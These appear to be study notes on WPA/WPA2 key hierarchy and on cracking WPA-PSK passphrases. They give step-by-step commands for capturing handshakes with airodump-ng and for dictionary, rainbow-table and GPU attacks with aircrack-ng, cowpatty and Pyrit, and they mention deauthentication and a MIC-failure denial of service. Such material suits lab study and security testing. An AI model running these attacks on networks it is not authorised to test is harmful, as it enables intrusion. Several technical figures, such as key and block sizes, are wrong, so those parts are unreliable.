# WPA and WPA2

## WPA

WPA intruduces a hierarchical key structure; the most important of the keys is the PMK (Pairwise Master Key) which can be calculated in two ways.  The PMK is used to generate the PTK (Pairwise Transient Key) and GTK (Group Temporal Key). There are also EAPOL KCK, EAPOL KEK and Temporal keys.

- PMK is passed to a PBKDF2 function
- PTK is created using a fixed string, AP and Client MAC addresses and nonces sent by client and AP
- PTK is used to encrypt client to AP traffic
- GTK is used to encrypt broadcast traffic
- WPA encryption both PTK and GTK are 512-bit and generated in a four-way handshake

 If WPA-PSK (WPA Personal) is enabled the key is loaded from local resources, otherwise an exteranal server is used for authentication.

### EAP authentication

First sends an association request to the AP, which replies with an authentication request to the client.  Next, several methods broadcast by the AP such as MD5 challenge, TLS, TTLS, or PEAP.  The user is identified and authenticated.  During this process the authenticator communicates with a special authentication server via a different protocol (ie: RADIUS), ideally over a separate wired connection.  The server has a DB with user IDs and passworks and tells the AP if the user is authorized, this uses a centralized infrastructure, using a single server handling multiple APs.

### Dictionary Attack

Uses a captured packets and a txt file containing common passwords, this is time consuming. **must be in monitor mode**

First you must capture packets until you collect the four-way WPA handshake

```sh
airodump-ng --channel 6 --write <packet.cap> <interface>
# or
airodump-ng -c 6 -w <packet.cap> <interface>
```

Next attempt to recover the key using a dictionary file from the cuda-ext archive as the passwords list

```sh
aircrack-ng -w cuda-ext/hackme/dict.txt -0 <packet.cap>
# -w dictionary file
# -0 captured packet
```

## WPA2 

The  key  negotiation  phase  in  WPA2  is  identical  to  the  four-way  handshake  employed  in  WPA  except  for  PMK  size,  now  384  bits.  This update is a by-product of dropping TMK keys. They have been deemed  redundant  due  to  the  omission  of  Michael  (the  CCMP  protocol  has  a  built-in  MIC  generation  function).  Although  as  you  can  see  encryption  has  become  more  complicated  overall,  it  also  delivers stronger security. IVs reappear in WPA2, but the name has been  changed  to  PNs  (packet  numbers).  Similar  to  WPA,  PNs  are  successively  increased,  or  incrementing,  by  1  until  they  overf low.  The PN code is stored in CCMP headers together with the key ID of an encrypted MPDU. The packet number also constructs a Nonce, which  includes  the  said  packet  number,  sender  MAC  address  and  the  priority  field  (no  longer  used  now:  set  to  zero).  The  temporal  key, derived using the same method as in WPA, is passed to the CCMP  encryption  block  alongside  the  Nonce  field,  plaintext  data  and  AAD.  Additional  Authentication  Data  is  a  field  that  contains  information  pertaining  to  all  MAC  header  fields  that  should  not  change in transit. The information includes source and destination address. These inputs are processed by the CCMP function, a stream processing-optimized  AES  algorithm  variant  in  the  CCM  mode.  The AES (Advanced Encryption Standard) is a block cipher, and so you need to feed it data in portions exactly 128 bytes in size. With the  modification,  this  is  not  necessary.  The  CCM  mode  takes  into  account  both  earlier  block  encryption  outputs  and  the  counter  function  output.  The  latter  result  is  concatenated  with  MAC  and  CCMP headers and next sent.

> The only effective attack on WPA2 is a brute force technique, which can be launched offline using a captured four-way handshake.  To sniff this negotiaion you can wait for a user to log on or force using a deauthentication technique. 

### Brute Force w/ dictionary

This attack is time consuming using the dictionary attack.  This is beause PBKDF2 generates the PTK and repeats the HMAC SHA-1 hash 4,096 times.  Dictionaries [http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists/languages/]. 


#### Create the dictionary 

There is a dictionary in Kali found in /usr/share/wordlists/rockyou.txt.gz

```sh
# copy it to local
cp /usr/share/wordlists/rockyou.txt.gz .
# gunzip it
gunzip rockyou.txt.gz
# unique sort and min 8 characters, max of 63 for WPA
cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > new_rockyou_min8_max63.txt
```

First you must capture packets until you collect the four-way WPA handshake

```sh
airodump-ng -w <packet.cap> -c 1 <interface>
# -w packet file
# -c channel
```

Using a dictionary

```sh
aircrack-ng -w <dictionary.file> -0 <packet.cap>
```

### Rainbow tables

Rainbow tables take advantage of the limited domain of hashes.  If you had try to compute a table storing all possible hashes for even a 64-bit function there woul be 2^64 possible hashes, each 64 bits (8 bytes) in size.  Overall,  it’s  2^64*23  B  =  257  KB  =  247  MB  =  237  GB  =  227  TB,  or  roughly  134  million  terabytes!  A  1  TB  hard  drive  costs  about  100  dollars, so to store your table you would need to cough up more than 13 billion.

Rainbow tables include hash chains that represent many values but only store the starting and end points.  Due to this the precomputing of rainbow tables takes longer but storage space is saved, the longer the chain the less space needed.  [Project Rainbowcrack](http://project-rainbowcrack.com)

The cowpatty attack uses a captured four-way handshake and uses a precomputed hash database.

```sh
cowpatty -s "<ESSID>" -r <captured-four-way.cap> -d <hash-file>
# -s is the ESSID network name
# -r name of the four-way handshake capture file
# -d the name of the hashfile
```

Aircrack also has an attack (still under development)

```sh
aircrack-ng -r <hash-file> <captured-four-way.cap>
# -r is the precomputed hashfile
```

Aircrack takes a different formatted hashfile from cowpatty but includes a converter

```sh
airolib-ng <export-hash-file> --import cowpatty <cowpatty-hash-file>
# converting cowpatty hash-file to aircrack-ng format
```

> Additional attacks include a DOS attack that takes advantage of the MIC failure hold off time.  Recall that if an AP receives an incorrect MIC it suspends traffic on a network for 60 seconds.  So merely sending 2 packets per minute you can shutdown an AP, and difficult to trace the attack even with specialist equipment.

### CUDA powered attacks

Compute Unified Device Architecture is a parallel computing platform developed by NVIDIA and implemented by multi-core NVIDIA GPUs [Supported GPUS](http://en.wikipedia.org/wiki/CUDA#Supported_GPUs).  CUDA GPUs can be used for number crunching and able to execute thousands of threads concurrently on multiple cores, uses including cryptography and bioinformatics. CUDA libraries for C, Java, Python, Fortran and MATLAB are also available

You'll need the CUDA Toolkit

```sh
sudo apt update
sudo apt install nvidia-cuda-toolkit
# check installation
nvcc --version
```

Cowpatty usage:

- -f: dictionary file
- -d: hash table file
- -r: packet capture file
- -s: network ESSID
- -c: checks four-way handshake
- -h: print help
- -v: prints verbose information
- -V: program version

---

#### **Pyrit**

Pyrit is a WPA-PSK and WPA2-PSK cracker and currently the most efficient tool that can utilize ATI-Stream, NVIDIA CUDA, OpenCL and  VIA Padlock.

Pyrit operates in two modes: pass-through mode ( pyrit calculates PMK in real time and sends to cowpatty ) and batch-processing mode.

##### **Pass-through**

```sh
pyrit -e <ESSID> -f <DICTIONARY-FILE> passthrough | cowpatty -r <CAPTURED-4WAY-FILE> -s <ESSID> -d -
# -d means hashes come from standard input
```

Cowpatty comparison (took 10x longer)

```sh
cowpatty -r wpa-hackme-01.cap -s hackingschool -f dict.txt
# -r captured packet
# -s network ESSID
# -f dictionary file .txt
```

##### **Batch-processing**

First step is hash table generation starting with creation of new ESSID

```sh
# create a new ESSID
pyrit -e <NEW-ESSID> create_essid
# example
pyrit -e HackthisNetwork create_essid
```

Check that the ESSID was created

```sh
pyrit list_essids
```

Next import the wordlist dictionary into the database

```sh
pyrit -e <NEW-ESSID> -i <DICTIONARY-FILE> import_passwords
# or
pyrit -i <DICTIONARY-FILE> import_passwords
```

Finally you can start batch processing and generate PMKs for the database with CUDA this will be 100x faster than CPU

```sh
pyrit -e <NEW-ESSID> batch
```

You can export the computed PMK database for both **cowpatty** and **aircrack-ng** formats.  

```sh
pyrit -e <NEW-ESSID> -f <DICTIONARY-FILE> export_cowpatty
```

To begin the crack

```sh
cowpatty -d <DICTIONARY-HASH-EXPORT> -r <CAPTURED-4WAY-FILE> -s <ESSID>
```

Or export for aircrack-ng

```sh
pyrit -e <NEW-ESSID> -f <DICTIONARY-FILE> export_hashdb
```

and crack

```sh
aircrack-ng -r <DICTIONARY-HASH-EXPORT> -e <ESSID> <CAPTURED-4WAY-FILE>
```

### Aircrack Tools

- aircrack-ng: cracks WEP (brute force) and WPA keys (dictionary attack).
- airdecap-ng: decrypts packet capture files using a key.
- airmon-ng: enables monitor mode on wireless network interfaces.
- aireplay-ng: allows packet injection.
- airodump-ng:  a  sniffer  capturing  network  packets  to  PCAP  and  IVS files.
- airolib-ng: a database to store and manage ESSID and password lists.
- packetforge-ng: generates encrypted packets to inject.
- airbase-ng: enables attacks against clients by setting a rogue AP to capture a password.
- airdecloak-ng: removes  WEP  Cloaking  from  PCAP  files  with  saved captures.
- airdriver-ng: manages wireless interface drivers.
- airserv-ng: enables remote access to a wireless interface.
- buddy-ng:  an  auxiliary  server  for  easside-ng,  runs  on  a  remote  host.
- easside-ng: communicates to an AP without knowing the WEP key.
- tkiptun-ng: mounts WPA/TKIP attacks.
- wesside-ng: an auto-magic tool t hat recovers WEP keys.

